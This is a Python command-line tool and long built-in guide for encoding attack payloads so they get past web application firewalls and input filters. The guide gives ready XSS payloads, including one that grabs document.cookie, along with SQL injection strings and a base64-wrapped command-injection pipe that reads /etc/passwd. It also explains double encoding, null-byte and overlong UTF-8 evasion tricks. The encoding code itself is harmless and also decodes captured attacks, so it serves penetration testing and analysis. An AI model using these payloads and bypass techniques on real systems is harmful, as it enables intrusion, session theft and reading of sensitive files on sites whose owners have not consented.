#!/usr/bin/env python3
"""
Payload Encoder - Encode Payloads to Bypass Filters
For authorized security testing only

QUICK START:
    ./payload_encoder.py -p "<script>alert(1)</script>" --all
    ./payload_encoder.py -p "whoami" --base64 --url
    ./payload_encoder.py -f payload.txt --hex
"""

import argparse
import sys
import os
import base64
import urllib.parse
import html
import codecs
from typing import List, Dict

# Colors
class C:
    R = '\033[91m'
    Y = '\033[93m'
    G = '\033[92m'
    B = '\033[94m'
    M = '\033[95m'
    C = '\033[96m'
    W = '\033[97m'
    E = '\033[0m'
    BOLD = '\033[1m'

HELP_TEXT = r"""
================================================================================
                    PAYLOAD ENCODER - COMPREHENSIVE GUIDE
                    Filter Bypass Through Encoding
================================================================================

WHY ENCODING MATTERS
--------------------
Security filters (WAFs, input validation, sanitization) look for known attack
patterns. But they often check for LITERAL patterns. If you encode your payload,
the filter might not recognize it, but the application will still process it.

THE KEY INSIGHT:
  Filter sees: %3Cscript%3E     -> Doesn't match "<script>" -> ALLOWED
  Browser sees: %3Cscript%3E    -> Decodes to "<script>" -> EXECUTES

This works because:
  1. Filters often check input BEFORE decoding
  2. Applications/browsers decode BEFORE processing
  3. Different contexts decode different encodings


UNDERSTANDING ENCODING CONTEXTS
-------------------------------

URL CONTEXT (query parameters, paths)
  Characters like <, >, ", ' have special meaning
  URL encoding converts to %XX format
  Browser/server decodes before use

  EXAMPLE:
    ?search=<script>           -> Blocked
    ?search=%3Cscript%3E       -> May pass filter, browser decodes

HTML CONTEXT (page content)
  HTML entities are decoded by browser
  &#60; becomes < when rendered
  &lt; becomes < when rendered

  EXAMPLE:
    <div>&#60;script&#62;</div>  -> Browser renders as <script>

JAVASCRIPT CONTEXT (inside scripts)
  Unicode escapes (\uXXXX) decoded by JS engine
  Hex escapes (\xXX) decoded by JS engine

  EXAMPLE:
    var x = "\u003cscript\u003e"  -> JS sees "<script>"


ENCODING TYPES EXPLAINED
------------------------

URL ENCODING (%XX)
  Each byte becomes %HH (hex value)
  Standard for web requests
  Decoded by web servers/browsers

  < = %3C    > = %3E    " = %22    ' = %27    space = %20

  USE: URL parameters, GET/POST data
  BYPASS: Basic WAF rules, input filters

DOUBLE URL ENCODING (%25XX)
  URL encode the percent sign itself
  %3C becomes %253C

  WHY IT WORKS:
    1. WAF sees %253C (doesn't match patterns)
    2. Server decodes once: %3C
    3. Application decodes again: <

  USE: When single encoding is filtered

HTML ENTITY ENCODING
  Named: &lt; &gt; &amp; &quot;
  Decimal: &#60; &#62; &#38;
  Hex: &#x3C; &#x3E; &#x26;

  All decode to the same character in HTML

  USE: XSS in HTML context

BASE64 ENCODING
  Converts binary to printable ASCII
  No special characters in output (A-Z, a-z, 0-9, +, /, =)

  USE:
    - Hiding payloads in parameters
    - Command injection: echo PAYLOAD | base64 -d | bash
    - Data exfiltration

  EXAMPLE:
    id -> aWQ=
    Then: echo aWQ= | base64 -d | sh

HEX ENCODING (\xXX)
  Each byte as hex value
  Interpreted by many parsers (JS, PHP, etc.)

  USE: JavaScript strings, some command contexts

UNICODE ENCODING (\uXXXX)
  Each character as Unicode code point
  Decoded by JavaScript

  USE: JavaScript context XSS

OCTAL ENCODING (\XXX)
  Each byte as octal value
  Interpreted by some parsers

  USE: Legacy systems, some shell contexts


SCENARIO-BASED USAGE
--------------------

SCENARIO: XSS payload blocked by WAF
COMMAND:  ./payload_encoder.py -p "<script>alert(1)</script>" --all
WHY:      See all encoding options at once
          Try each one until one bypasses
NEXT:     If URL encoding works: use in URL parameter
          If HTML encoding works: use in form input
          Mix encodings if single encoding blocked


SCENARIO: SQL injection being filtered
COMMAND:  ./payload_encoder.py -p "' OR '1'='1" --url --url2
WHY:      Single quotes and spaces often filtered
          URL encoding may bypass
NEXT:     Try %27 instead of '
          Try %20 instead of space
          Double encode if single blocked


SCENARIO: Command injection through base64
COMMAND:  ./payload_encoder.py -p "cat /etc/passwd" --base64
WHY:      Creates base64 version of command
          Target may decode and execute
NEXT:     Inject: echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh
          Bypasses command filtering


SCENARIO: Bypassing client-side JavaScript filter
COMMAND:  ./payload_encoder.py -p "alert(document.cookie)" --unicode
WHY:      JS interprets Unicode escapes
          Filter may not recognize encoded version
NEXT:     Use \u0061\u006c\u0065\u0072\u0074 for "alert"
          Browser's JS engine decodes it


SCENARIO: Need to decode found payload
COMMAND:  ./payload_encoder.py -p "JTNDc2NyaXB0JTNFYWxlcnQoMSklM0MlMkZzY3JpcHQlM0U=" -d --base64
WHY:      Attacker's payload is encoded
          Need to see what it actually does
NEXT:     Decode to understand the attack
          May need multiple decode passes


BYPASS TECHNIQUES
-----------------

TECHNIQUE 1: Case Variation (not encoding but useful)
  <script> blocked -> <ScRiPt> might work
  SELECT blocked -> SeLeCt might work

TECHNIQUE 2: Mixed Encoding
  Encode different parts differently
  <script> -> %3Cscript> (partial)
  Or: <scr%69pt> (just the 'i')

TECHNIQUE 3: Double Encoding
  When app decodes twice or filter decodes before checking
  < -> %3C -> %253C
  After two decodes: <

TECHNIQUE 4: Null Bytes (older systems)
  %00 can terminate strings early
  <scr%00ipt> might bypass filters looking for "script"

TECHNIQUE 5: Overlong UTF-8
  Non-standard UTF-8 representations
  < can be represented as C0 BC in overlong form
  Some parsers accept this


CHAINING ENCODINGS
------------------
Sometimes you need to combine encodings:

1. HTML encode payload
2. Then URL encode the result
3. Server URL decodes: now you have HTML encoded
4. Browser HTML decodes: payload executes

EXAMPLE:
  <script>alert(1)</script>
  HTML: &lt;script&gt;alert(1)&lt;/script&gt;
  URL:  %26lt%3Bscript%26gt%3Balert(1)%26lt%3B%2Fscript%26gt%3B


COMMON FILTER BYPASSES
----------------------

XSS Filters:
  <script>      -> %3Cscript%3E
  <script>      -> <scr\x69pt>     (hex in JS)
  <img onerror> -> <img/onerror>   (add /)
  javascript:   -> java\tscript:   (add tab)

SQL Injection:
  ' OR '1'='1   -> ' OR '1'%3D'1   (encode =)
  UNION SELECT  -> UNION/**/SELECT (comment instead of space)
  ' OR 1=1--    -> %27%20OR%201%3D1--

Command Injection:
  ;id           -> %3Bid
  |cat /etc/passwd -> |base64 encoded version
  `whoami`      -> $(whoami)       (alternate syntax)


WHEN TO USE WHICH ENCODING
--------------------------

URL Parameters:     Start with URL encoding (%XX)
Form Fields:        Try HTML entities first
JavaScript:         Unicode or Hex escapes
Command Line:       Base64 for hiding commands
Multiple Filters:   Double/triple encoding


COMMON MISTAKES TO AVOID
------------------------
1. Using wrong encoding for the context
2. Not trying multiple encodings
3. Forgetting double encoding option
4. Not checking if filter decodes before checking
5. Over-encoding (too much encoding breaks payload)


COMMAND REFERENCE
-----------------
INPUT:
  -p, --payload TEXT    Payload to encode
  -f, --file PATH       Read payload from file
  -d, --decode          Decode instead of encode

URL ENCODINGS:
  --url                 Standard URL encoding (%XX)
  --url2                Double URL encoding (%25XX)

HTML ENCODINGS:
  --html                HTML entity encoding (&lt;)
  --html-dec            HTML decimal (&#60;)
  --html-hex            HTML hex (&#x3C;)

OTHER ENCODINGS:
  --base64              Base64 encoding
  --hex                 Hex encoding (\xXX)
  --unicode             Unicode encoding (\uXXXX)
  --octal               Octal encoding (\XXX)
  --binary              Binary representation
  --rot13               ROT13 Caesar cipher
  --reverse             Reverse string
  --charcode            JS String.fromCharCode()

OUTPUT:
  --all                 Show all encoding types


DECODING UNKNOWN PAYLOADS
-------------------------
When analyzing attacks:
  1. Look at the encoding pattern
  2. %XX = URL encoded
  3. &#XX; or &name; = HTML encoded
  4. Ends with = or == = likely Base64
  5. Try: ./payload_encoder.py -p "encoded" -d --type
================================================================================
"""

def banner():
    print(f"""{C.C}
    ____              __                __
   / __ \\____ ___  __/ /___  ____ _____/ /
  / /_/ / __ `/ / / / / __ \\/ __ `/ __  /
 / ____/ /_/ / /_/ / / /_/ / /_/ / /_/ /
/_/    \\__,_/\\__, /_/\\____/\\__,_/\\__,_/
            /____/  {C.E}{C.Y}Encoder{C.E}
""")

def url_encode(text: str) -> str:
    """URL encode (percent encoding)"""
    return urllib.parse.quote(text, safe='')

def url_encode_double(text: str) -> str:
    """Double URL encode"""
    return urllib.parse.quote(urllib.parse.quote(text, safe=''), safe='')

def url_decode(text: str) -> str:
    """URL decode"""
    return urllib.parse.unquote(text)

def html_encode(text: str) -> str:
    """HTML entity encode"""
    return html.escape(text)

def html_decode(text: str) -> str:
    """HTML entity decode"""
    return html.unescape(text)

def html_decimal_encode(text: str) -> str:
    """HTML decimal entity encode"""
    return ''.join(f'&#{ord(c)};' for c in text)

def html_hex_encode(text: str) -> str:
    """HTML hex entity encode"""
    return ''.join(f'&#x{ord(c):x};' for c in text)

def base64_encode(text: str) -> str:
    """Base64 encode"""
    return base64.b64encode(text.encode()).decode()

def base64_decode(text: str) -> str:
    """Base64 decode"""
    try:
        return base64.b64decode(text).decode()
    except:
        return "[Error decoding base64]"

def hex_encode(text: str) -> str:
    """Hex encode (\\xXX format)"""
    return ''.join(f'\\x{ord(c):02x}' for c in text)

def hex_encode_raw(text: str) -> str:
    """Raw hex encode (no prefix)"""
    return text.encode().hex()

def hex_decode(text: str) -> str:
    """Hex decode"""
    try:
        # Handle \xXX format
        if '\\x' in text:
            return codecs.decode(text, 'unicode_escape')
        # Handle raw hex
        return bytes.fromhex(text).decode()
    except:
        return "[Error decoding hex]"

def unicode_encode(text: str) -> str:
    """Unicode encode (\\uXXXX format)"""
    return ''.join(f'\\u{ord(c):04x}' for c in text)

def unicode_encode_full(text: str) -> str:
    """Full Unicode encode (\\uXXXX)"""
    return ''.join(f'\\u00{ord(c):02x}' for c in text)

def octal_encode(text: str) -> str:
    """Octal encode"""
    return ''.join(f'\\{ord(c):03o}' for c in text)

def binary_encode(text: str) -> str:
    """Binary representation"""
    return ' '.join(format(ord(c), '08b') for c in text)

def rot13_encode(text: str) -> str:
    """ROT13 encode/decode"""
    return codecs.encode(text, 'rot_13')

def reverse_string(text: str) -> str:
    """Reverse string"""
    return text[::-1]

def char_code_encode(text: str) -> str:
    """JavaScript String.fromCharCode format"""
    codes = ','.join(str(ord(c)) for c in text)
    return f"String.fromCharCode({codes})"

def concat_encode(text: str) -> str:
    """Concatenation format for filter bypass"""
    return '+'.join(f'"{c}"' for c in text)

def encode_payload(payload: str, encoding_type: str) -> str:
    """Encode payload with specified encoding"""
    encoders = {
        'url': url_encode,
        'url2': url_encode_double,
        'html': html_encode,
        'html-dec': html_decimal_encode,
        'html-hex': html_hex_encode,
        'base64': base64_encode,
        'hex': hex_encode,
        'hex-raw': hex_encode_raw,
        'unicode': unicode_encode,
        'unicode-full': unicode_encode_full,
        'octal': octal_encode,
        'binary': binary_encode,
        'rot13': rot13_encode,
        'reverse': reverse_string,
        'charcode': char_code_encode,
        'concat': concat_encode,
    }

    if encoding_type in encoders:
        return encoders[encoding_type](payload)
    return payload

def decode_payload(payload: str, encoding_type: str) -> str:
    """Decode payload with specified encoding"""
    decoders = {
        'url': url_decode,
        'url2': lambda x: url_decode(url_decode(x)),
        'html': html_decode,
        'base64': base64_decode,
        'hex': hex_decode,
        'rot13': rot13_encode,  # ROT13 is self-inverse
        'reverse': reverse_string,
    }

    if encoding_type in decoders:
        return decoders[encoding_type](payload)
    return f"[Decoding not supported for {encoding_type}]"

def encode_all(payload: str) -> Dict[str, str]:
    """Generate all encodings"""
    encodings = {}
    types = ['url', 'url2', 'html', 'html-dec', 'html-hex', 'base64',
             'hex', 'hex-raw', 'unicode', 'octal', 'binary', 'rot13',
             'reverse', 'charcode', 'concat']

    for enc_type in types:
        try:
            encodings[enc_type] = encode_payload(payload, enc_type)
        except Exception as e:
            encodings[enc_type] = f"[Error: {e}]"

    return encodings

def main():
    parser = argparse.ArgumentParser(
        description='Payload Encoder',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    parser.add_argument('-p', '--payload', help='Payload to encode')
    parser.add_argument('-f', '--file', help='Read payload from file')
    parser.add_argument('-d', '--decode', action='store_true', help='Decode instead')

    # Encoding types
    parser.add_argument('--all', action='store_true', help='All encodings')
    parser.add_argument('--url', action='store_true', help='URL encode')
    parser.add_argument('--url2', action='store_true', help='Double URL encode')
    parser.add_argument('--html', action='store_true', help='HTML entity encode')
    parser.add_argument('--html-dec', action='store_true', help='HTML decimal encode')
    parser.add_argument('--html-hex', action='store_true', help='HTML hex encode')
    parser.add_argument('--base64', action='store_true', help='Base64 encode')
    parser.add_argument('--hex', action='store_true', help='Hex encode')
    parser.add_argument('--unicode', action='store_true', help='Unicode encode')
    parser.add_argument('--octal', action='store_true', help='Octal encode')
    parser.add_argument('--binary', action='store_true', help='Binary encode')
    parser.add_argument('--rot13', action='store_true', help='ROT13 encode')
    parser.add_argument('--reverse', action='store_true', help='Reverse string')
    parser.add_argument('--charcode', action='store_true', help='JS charCode format')

    parser.add_argument('--help-full', action='store_true', help='Show detailed help')

    args = parser.parse_args()

    if args.help_full:
        print(HELP_TEXT)
        return

    # Get payload
    payload = None
    if args.payload:
        payload = args.payload
    elif args.file:
        try:
            with open(args.file, 'r') as f:
                payload = f.read().strip()
        except Exception as e:
            print(f"{C.R}[!]{C.E} Error reading file: {e}")
            return

    if not payload:
        banner()
        parser.print_help()
        print(f"\n{C.Y}Tip:{C.E} Use --help-full for detailed usage guide")
        return

    banner()
    print(f"{C.B}[*]{C.E} Original: {C.Y}{payload}{C.E}\n")

    # Determine which encodings to show
    if args.all:
        encodings = encode_all(payload)
        for enc_type, encoded in encodings.items():
            print(f"{C.G}{enc_type:12}{C.E} {encoded}")
        return

    # Specific encodings
    enc_types = []
    if args.url: enc_types.append('url')
    if args.url2: enc_types.append('url2')
    if args.html: enc_types.append('html')
    if args.html_dec: enc_types.append('html-dec')
    if args.html_hex: enc_types.append('html-hex')
    if args.base64: enc_types.append('base64')
    if args.hex: enc_types.append('hex')
    if args.unicode: enc_types.append('unicode')
    if args.octal: enc_types.append('octal')
    if args.binary: enc_types.append('binary')
    if args.rot13: enc_types.append('rot13')
    if args.reverse: enc_types.append('reverse')
    if args.charcode: enc_types.append('charcode')

    if not enc_types:
        # Default to common encodings
        enc_types = ['url', 'html', 'base64', 'hex']

    for enc_type in enc_types:
        if args.decode:
            result = decode_payload(payload, enc_type)
            print(f"{C.G}{enc_type:12}{C.E} {result}")
        else:
            result = encode_payload(payload, enc_type)
            print(f"{C.G}{enc_type:12}{C.E} {result}")

if __name__ == '__main__':
    main()
